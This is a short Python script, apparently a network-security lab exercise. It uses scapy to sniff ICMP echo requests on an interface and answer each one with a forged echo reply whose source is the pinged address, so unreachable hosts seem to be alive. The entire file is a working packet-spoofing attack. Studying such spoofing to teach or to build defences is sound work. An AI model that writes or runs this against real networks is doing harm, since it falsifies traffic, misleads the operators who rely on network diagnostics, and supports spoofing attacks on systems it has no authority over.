#!/usr/bin/python3

from scapy.all import *

def spoof_reply(pkt):
    if(pkt[2].type == 8):
        print("Creating spoof packet...")
        dst = pkt[1].dst
        src = pkt[1].src
        seq = pkt[2].seq
        id = pkt[2].id
        load = pkt[3].load
        reply = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/load
        send(reply)



if __name__=="__main__":

    # define the network interface
    iface = "ens18"

    # filter for only ICMP trafic
    filter = "icmp"

    # start sniffing
    sniff(iface=iface, prn=spoof_reply, filter=filter)